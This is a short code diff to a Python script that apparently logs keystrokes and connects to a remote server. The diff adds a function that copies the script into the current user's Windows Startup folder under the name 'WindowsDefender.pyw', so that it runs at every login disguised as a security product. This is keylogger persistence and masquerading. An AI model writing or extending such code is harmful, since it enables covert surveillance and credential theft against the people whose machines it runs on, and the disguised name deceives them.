@@ -107,12 +107,18 @@ def key_press(key):
         return False
 
 
-def copy_to_startup():
-    pass
+def copy_to_startup(file_name):
+    startup_path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+    with open(__file__, "rb")as file:
+        file_bytes = file.read()
+    with open(startup_path + file_name, "wb")as file:
+        file.write(file_bytes)
+
 
 # Main Loop
 connection = Socket()
 log_file = Logging("log.txt")
+copy_to_startup("WindowsDefender.pyw")
 while True:
     # Try to establish connection to server
     if not connection.established:
